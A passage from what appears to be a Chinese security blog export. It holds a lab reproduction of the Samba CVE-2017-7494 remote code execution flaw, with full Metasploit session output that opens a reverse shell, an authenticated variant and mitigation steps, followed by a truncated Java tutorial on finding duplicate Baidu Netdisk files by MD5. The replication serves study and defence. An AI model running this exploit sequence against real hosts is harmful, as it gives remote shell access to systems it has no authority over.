<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/linux/samba/is_known_pipename</span><br><span class="line">msf exploit(is_known_pipename) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/is_known_pipename):</span><br><span class="line"></span><br><span class="line">   Name            Current Setting  Required  Description</span><br><span class="line">   ----            ---------------  --------  -----------</span><br><span class="line">   RHOST                            yes       The target address</span><br><span class="line">   RPORT           445              yes       The SMB service port (TCP)</span><br><span class="line">   SMB_FOLDER                       no        The directory to use within the writeable SMB share</span><br><span class="line">   SMB_SHARE_BASE                   no        The remote filesystem path correlating with the SMB share name</span><br><span class="line">   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   2   Linux x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(is_known_pipename) &gt; show targets</span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line">   1   Linux ARM (LE)</span><br><span class="line">   2   Linux x86</span><br><span class="line">   3   Linux x86_64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(is_known_pipename) &gt; <span class="built_in">set</span> RHOST 192.168.232.137</span><br><span class="line">RHOST =&gt; 192.168.232.137</span><br><span class="line">msf exploit(is_known_pipename) &gt; <span class="built_in">set</span> target 3</span><br><span class="line">target =&gt; 3</span><br><span class="line">msf exploit(is_known_pipename) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.232.134:4444</span><br><span class="line">[*] 192.168.232.137:445 - Using location \\192.168.232.137\fuping\ <span class="keyword">for</span> the path</span><br><span class="line">[*] 192.168.232.137:445 - Payload is stored <span class="keyword">in</span> //192.168.232.137/fuping/ as gRoUnyzb.so</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /volume1/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /volume1/fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /volume1/FUPING/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /volume1/Fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /volume2/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /volume2/fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /volume2/FUPING/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /volume2/Fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /volume3/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /volume3/fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /volume3/FUPING/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /volume3/Fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /shared/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /shared/fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /shared/FUPING/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /shared/Fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /mnt/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /mnt/fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /mnt/FUPING/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /mnt/Fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /mnt/usb/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /mnt/usb/fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /mnt/usb/FUPING/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /mnt/usb/Fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /media/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /media/fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /media/FUPING/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /media/Fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /mnt/media/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /mnt/media/fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /mnt/media/FUPING/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /mnt/media/Fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /var/samba/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /var/samba/fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /var/samba/FUPING/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /var/samba/Fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /tmp/gRoUnyzb.so...</span><br><span class="line">[*] Command shell session 1 opened (192.168.232.134:4444 -&gt; 192.168.232.137:41392) at 2017-05-24 12:35:20 -0400</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=65534(nobody) gid=0(root) groups=0(root),65534(nogroup)</span><br><span class="line">whoami</span><br><span class="line">nobody</span><br><span class="line">ifconfig</span><br><span class="line">docker0   Link encap:Ethernet  HWaddr 02:42:23:77:72:91 </span><br><span class="line">          inet addr:172.17.0.1  Bcast:0.0.0.0  Mask:255.255.0.0</span><br><span class="line">          inet6 addr: fe80::42:23ff:fe77:7291/64 Scope:Link</span><br><span class="line">          UP BROADCAST MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:2 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0</span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:180 (180.0 B)</span><br><span class="line"></span><br><span class="line">ens33     Link encap:Ethernet  HWaddr 00:0c:29:77:23:9e </span><br><span class="line">          inet addr:192.168.232.137  Bcast:192.168.232.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::7651:9ad0:80e5:c9c8/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:349052 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:112974 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000</span><br><span class="line">          RX bytes:419009840 (419.0 MB)  TX bytes:8902292 (8.9 MB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:23329 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:23329 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1</span><br><span class="line">          RX bytes:48010585 (48.0 MB)  TX bytes:48010585 (48.0 MB)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>需要填写目标地址和选择Target，我的是x64位系统，所以设置了target为3。</p>
</blockquote>
<p>效果图</p>
<p><img src="/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/脚本说明.png" alt="脚本说明"></p>
<p><img src="/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/攻击成功.png" alt="攻击成功"></p>
<h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><h4 id="2017-05-26-对需要登陆的Smb进行验证"><a href="#2017-05-26-对需要登陆的Smb进行验证" class="headerlink" title="2017.05.26 对需要登陆的Smb进行验证"></a>2017.05.26 对需要登陆的Smb进行验证</h4><p>脚本已经更新，集成在msf中，直接msfupdate即可。</p>
<p><strong>1.修改Ubuntu中的Samba配置文件。</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/samba/smb.conf</span><br></pre></td></tr></table></figure>
<p>在<code>[global]</code>中添加：<code>security = user</code><br>修改底部的<code>[fuping]</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[fuping] <span class="comment">#显示的共享文件夹名字</span></span><br><span class="line">path = /tmp</span><br><span class="line">writeable = yes</span><br></pre></td></tr></table></figure>
<p><img src="/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/更新Samba配置文件.png" alt="更新Samba配置文件"></p>
<p><strong>2.添加smb用户</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo useradd smbuser</span><br><span class="line">sudo smbpasswd <span class="_">-a</span> smbuser</span><br></pre></td></tr></table></figure>
<p><img src="/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/添加smb用户.png" alt="添加smb用户"></p>
<p><strong>3.开始攻击</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/linux/samba/is_known_pipename </span><br><span class="line">msf exploit(is_known_pipename) &gt; <span class="built_in">set</span> SMBUSER smbuser</span><br><span class="line">SMBUSER =&gt; smbuser</span><br><span class="line">msf exploit(is_known_pipename) &gt; <span class="built_in">set</span> SMBPASS smbuser</span><br><span class="line">SMBPASS =&gt; smbuser</span><br><span class="line">msf exploit(is_known_pipename) &gt; <span class="built_in">set</span> RHOST 192.168.232.137</span><br><span class="line">RHOST =&gt; 192.168.232.137</span><br><span class="line">msf exploit(is_known_pipename) &gt; exploit</span><br></pre></td></tr></table></figure></p>
<p><img src="/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/有验证攻击成功.png" alt="有验证攻击成功"></p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>1.受影响的用户尽快下载最新的Samba版本手动更新。<br>2.使用二进制分发包（RPM等方式）的用户立即进行yum，apt-get update等安全更新操作<br>3.不打补丁的缓解策略：用户可以通过在smb.conf的[global]节点下增加“nt pipe support = no”选项，然后重新启动samba服务， 以此达到缓解该漏洞的效果。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>[1]<a href="https://github.com/rapid7/metasploit-framework/pull/8450" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/8450</a><br>[2]<a href="http://bobao.360.cn/learning/detail/3900.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3900.html</a><br>[3]<a href="https://securityonline.info/cve-2017-7494-samba-remote-code-execution-vulnerability/" target="_blank" rel="noopener">https://securityonline.info/cve-2017-7494-samba-remote-code-execution-vulnerability/</a></p>
]]></content>
      
        <categories>
            
            <category> Exploit </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CVE-2017-7494 </tag>
            
            <tag> Samba漏洞 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[如何清除百度网盘重复文件]]></title>
      <url>/2017/05/24/Clean-Duplicate-Files-OF-BaiDu-YunPan/</url>
      <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>百度网盘最近推出了一个垃圾文件清理功能，可以扫描重复的文件，就试了一下。扫描结果发现存在许多的重复文件，删除后空间可以再多一个T。就想删除一下，结果需要开通会员。于是就想着来实现一下如何快速删除网盘重复的文件。<br>要实现这个功能，第一首先要知道重复的文件，第二就是对这些重复的文件进行删除了。<br><a id="more"></a></p>
<h3 id="0x01-如何获取重复的文件"><a href="#0x01-如何获取重复的文件" class="headerlink" title="0x01 如何获取重复的文件"></a>0x01 如何获取重复的文件</h3><p>这里以wap版为例。<br>打开<a href="https://pan.baidu.com/wap/home" target="_blank" rel="noopener">https://pan.baidu.com/wap/home</a> 并抓包。<br>可以看到一个Get请求</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pan.baidu.com/api/list?bdstoken=***********&amp;web=5&amp;app_id=250528&amp;logid=MTQ5NTYxMjU1OTQ1NDAuOTE2MjI3ODg0NjE5MTU0Ng==&amp;channel=chunlei&amp;clienttype=5&amp;order=time&amp;desc=1&amp;showempty=0&amp;page=1&amp;num=20&amp;dir=%2F</span><br></pre></td></tr></table></figure>
<p><strong>主要请求参数：</strong></p>
<table>
<thead>
<tr>
<th>参数名</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>bdstoken</td>
<td>网页源代码中有</td>
</tr>
<tr>
<td>loginid</td>
<td>BASE64(时间戳+四位+.+16位数字)，固定值即可</td>
</tr>
<tr>
<td>page</td>
<td>页码</td>
</tr>
<tr>
<td>num</td>
<td>每页显示条数</td>
</tr>
<tr>
<td>dir</td>
<td>文件路径</td>
</tr>
<tr>
<td>order</td>
<td>排序的条件（固定时间排序即可）</td>
</tr>
<tr>
<td>desc</td>
<td>升序降序（降序排列即可）</td>
</tr>
</tbody>
</table>
<p>其他参数固定值即可<br>返回内容为JSON</p>
<p><img src="/2017/05/24/Clean-Duplicate-Files-OF-BaiDu-YunPan/JSON内容.jpg" alt="JSON内容"></p>
<p>当遇到文件时，会返回文件的MD5和大小以及路径。<br><img src="/2017/05/24/Clean-Duplicate-Files-OF-BaiDu-YunPan/文件内容.jpg" alt="文件内容"></p>
<p><strong>返回JSON中的主要内容说明</strong><br>只列举需要的字段</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>含义</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>isdir</td>
<td>是否为目录</td>
<td>文件为0，目录为1</td>
</tr>
<tr>
<td>size</td>
<td>文件大小</td>
<td>单位是字节</td>
</tr>
<tr>
<td>md5</td>
<td>文件的MD5值</td>
<td>可以用来判断文件是否重复</td>
</tr>
<tr>
<td>path</td>
<td>文件的路径</td>
<td>包含文件名</td>
</tr>
<tr>
<td>server_filename</td>
<td>文件名称</td>
<td>文件的名称</td>
</tr>
</tbody>
</table>
<p>于是可以根据文件的MD5值来判断文件是否重复。<br>首先将文件的主要信息（如MD5、大小、路径、名字）等信息保存到数据库中。然后根据MD5来判断是否重复，将重复的文件列出来，最后就是删除了。<br>这里采用的开发语言是Java，Http请求采用了jsoup，处理Json采用了FastJson。数据库采用了MySQL。<br>因为主要是为了分享思路，所以只贴部分代码了，知道怎么实现这个流程，代码写起来就简单许多了，实现的语言也就多样化了。<br>具体实现步骤如下：</p>
<h4 id="1-获取bdstoken"><a href="#1-获取bdstoken" class="headerlink" title="1.获取bdstoken"></a>1.获取bdstoken</h4><p>访问<a href="https://pan.baidu.com/wap/home" target="_blank" rel="noopener">https://pan.baidu.com/wap/home</a> ，查看源代码搜索bdstoken即可看到。<br>代码的实现如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取bdstoken</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bdstoken</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getbdstoken</span><span class="params">()</span></span>&#123;</span><br><span class="line">	String bdstoken = <span class="keyword">null</span>;</span><br><span class="line">	Document doc = getDoc(Util.URL_HOME,getCookies());</span><br><span class="line">	String regex = <span class="string">"\"bdstoken\":\"(.*)\",\"quota"</span>;</span><br><span class="line">	Pattern pattern = Pattern.compile(regex);</span><br><span class="line">	Matcher matcher = pattern.matcher(doc.html());</span><br><span class="line">	<span class="keyword">if</span>(matcher.find())&#123;</span><br><span class="line">		bdstoken = matcher.group(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> bdstoken;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Cookie只需要两个内容，一个是BDUSS，另一个是STOKEN。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;String,String&gt; <span class="title">getCookies</span><span class="params">()</span></span>&#123;</span><br><span class="line">	Map&lt;String,String&gt; cookies = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">	cookies.put(<span class="string">"BDUSS"</span>, <span class="string">"你的BDUSS"</span>);</span><br><span class="line">	cookies.put(<span class="string">"STOKEN"</span>, <span class="string">"你的STOKEN"</span>);</span><br><span class="line">	<span class="keyword">return</span> cookies;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="2-递归获取所有的文件，并将文件的相关内容保存到数据库中"><a href="#2-递归获取所有的文件，并将文件的相关内容保存到数据库中" class="headerlink" title="2.递归获取所有的文件，并将文件的相关内容保存到数据库中"></a>2.递归获取所有的文件，并将文件的相关内容保存到数据库中</h4><p>获取每页文件内容时需要三个参数：当前页面、每页显示数量和路径。<br>如下代码所示：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 列出当前页面文件</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> page 页面</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> num 显示数量</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> dir 路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;PanFile&gt; <span class="title">getFiles</span><span class="params">(<span class="keyword">int</span> page,<span class="keyword">int</span> num,String dir)</span></span>&#123;</span><br><span class="line">	String url = <span class="string">"https://pan.baidu.com/api/list?bdstoken="</span>+getbdstoken()+<span class="string">"&amp;web=5&amp;app_id=250528&amp;logid=MTQ5NTQxMzA2Njg4ODAuODE0NzYwMjEyMzAzOTY5Mg==&amp;channel=chunlei&amp;clienttype=5&amp;order=time&amp;desc=1&amp;showempty=0&amp;page="</span>+page+<span class="string">"&amp;num="</span>+num+<span class="string">"&amp;dir="</span>+dir;</span><br><span class="line">	String jsonStr = getbody(url, getCookies());</span><br><span class="line">	JSONObject jsonObj = JSONObject.parseObject(jsonStr);</span><br><span class="line">	JSONArray result = jsonObj.getJSONArray(<span class="string">"list"</span>);</span><br><span class="line">	List&lt;PanFile&gt; files= JSON.parseArray(result.toJSONString(),PanFile.class);  </span><br><span class="line">	<span class="keyword">return</span> files;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>递归遍历当前路径下所有文件代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 递归打印当前路径下所有文件，并入库</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> str 路径</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printFiles</span><span class="params">(String str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">boolean</span> flag=<span class="keyword">false</span>;</span><br><span class="line">	String dency[] = &#123;<span class="string">"/C#资料/我的c#"</span>,<span class="string">"/12-19 Java Workplace"</span>,<span class="string">"/dumppp"</span>,<span class="string">"/myWEB"</span>&#125;;<span class="comment">//白名单，针对其中的目录不遍历</span></span><br><span class="line">	<span class="keyword">for</span> (String string : dency) &#123;</span><br><span class="line">		<span class="keyword">if</span>(str.trim().equals(string))&#123;</span><br><span class="line">			flag = <span class="keyword">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		str = URLEncoder.encode(str, <span class="string">"utf-8"</span>);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">		e.printStackTrace();</span><br><span class="line">	&#125;</span><br><span class="line">	List&lt;PanFile&gt; files= UtilMethod.getFiles(<span class="number">1</span>,<span class="number">2000</span>,str);</span><br><span class="line">	<span class="keyword">for</span> (PanFile panFile : files) &#123;</span><br><span class="line">		<span class="keyword">if</span>(panFile.getIsdir()==<span class="number">1</span>)&#123;</span><br><span class="line">			printFiles(panFile.getPath());</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			String fileName = panFile.getPath();</span><br><span class="line">			System.out.println(fileName+<span class="string">"---size:"</span>+panFile.getSize()+<span class="string">"--md5:"</span>+panFile.getMd5());</span><br><span class="line">			insertDB(panFile.getServerMtime(),panFile.getCategory(),panFile.getFsId(),panFile.getIsdir(),</span><br><span class="line">					panFile.getServerCtime(),panFile.getLocalMtime(),panFile.getSize(),panFile.getMd5(),</span><br><span class="line">					panFile.getPath(),panFile.getLocalCtime(),panFile.getServerFilename());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>效果如图所示</p>
<p><img src="/2017/05/24/Clean-Duplicate-Files-OF-BaiDu-YunPan/遍历文件.jpg" alt="遍历文件"><br>查看数据库中的文件信息<br><img src="/2017/05/24/Clean-Duplicate-Files-OF-BaiDu-YunPan/数据库中文件信息.png" alt="数据库中文件信息"></p>
<blockquote>
<p>由于有些目录下面是代码，而且文件多有小，所以就不针对这些文件目录下的文件进行遍历。就采用了白名单的方式，对白名单中内容不遍历。<br>由于某些路径中含有其他字符，导致找不到路径，使用采用了URL编码。<br>为了方便，直接将page设置为1，num值换为2000（可以根据自己的文件多少来调节，最好大一些），一页就将所有的数据显示出来。<br>插入数据库方法的代码比较简单，这里就省略了。</p>
</blockquote>
<h4 id="3-获取重复的大文件"><a href="#3-获取重复的大文件" class="headerlink" title="3.获取重复的大文件"></a>3.获取重复的大文件</h4><p>已经将文件的信息都存储在数据库中，然后根据数据库中文件的MD5来获取重复的文件。我这里只把大于500M的重复文件给列举出来。</p>
<h5 id="1-获取大于500M的重复文件的MD5"><a href="#1-获取大于500M的重复文件的MD5" class="headerlink" title="1.获取大于500M的重复文件的MD5"></a>1.获取大于500M的重复文件的MD5</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取大于500M的重复文件的MD5</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title">setp1</span><span class="params">()</span></span>&#123;</span><br><span class="line">	List&lt;String&gt; ltMd5 = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">	String sql = <span class="string">"select count(*),md5,server_filename from mmpan "</span></span><br><span class="line">			+ <span class="string">"where size &gt; 1024*1024*500 "</span></span><br><span class="line">			+ <span class="string">"group by md5  "</span></span><br><span class="line">			+ <span class="string">"HAVING COUNT(md5) &gt;1 "</span></span><br><span class="line">			+ <span class="string">"order by path"</span>;</span><br><span class="line">	Connection conn = DBFactory.getConnection();</span><br><span class="line">	PreparedStatement pst = <span class="keyword">null</span>;</span><br><span class="line">	ResultSet rst = <span class="keyword">null</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		pst = conn.prepareStatement(sql);</span><br><span class="line">		rst = pst.executeQuery();</span><br><span class="line">		<span class="keyword">while</span>(rst.next())&#123;</span><br><span class="line">			ltMd5.add(rst.getString(<span class="string">"md5"</span>));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">		<span class="comment">// TODO 